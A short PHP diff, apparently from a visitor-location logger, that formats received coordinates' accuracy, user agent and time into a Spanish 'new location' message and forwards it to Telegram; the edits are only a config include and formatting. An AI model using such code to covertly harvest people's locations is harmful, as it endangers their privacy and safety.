@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
 
@@ -9,7 +10,7 @@ $payload = json_decode($raw, true);
 
 if (!is_array($payload)) {
     http_response_code(400);
-    echo json_encode(['status' => 'bad_request']);
+    echo json_encode(['status'=>'bad_request']);
     exit;
 }
 
@@ -28,7 +29,6 @@ $msg = "📍 <b>Nueva ubicación</b>\n".
        "🎯 Precisión: {$acc}m\n".
        "🖥️ UA: $ua\n".
        "⏰ Hora: $ts";
-
 send_to_telegram($msg);
 
-echo json_encode(['status'=>'logged','timestamp'=>$ts]);
+echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
